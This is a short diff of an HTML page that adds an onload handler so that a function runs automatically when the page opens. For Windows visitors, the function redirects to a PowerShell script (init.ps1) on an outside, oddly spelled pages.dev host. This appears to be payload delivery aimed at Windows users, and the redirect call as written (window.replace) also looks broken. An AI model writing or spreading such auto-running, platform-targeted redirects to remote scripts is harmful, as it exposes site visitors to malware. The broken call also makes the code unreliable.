@@ -6,9 +6,9 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>init</title>
 </head>
-<body>
+<body onload="init()">
   <script>
-  function detectos() {
+  function init() {
     if (navigator.platform === 'Win32') {
       window.replace('https://colorshelll.pages.dev/init.ps1');
     } else {
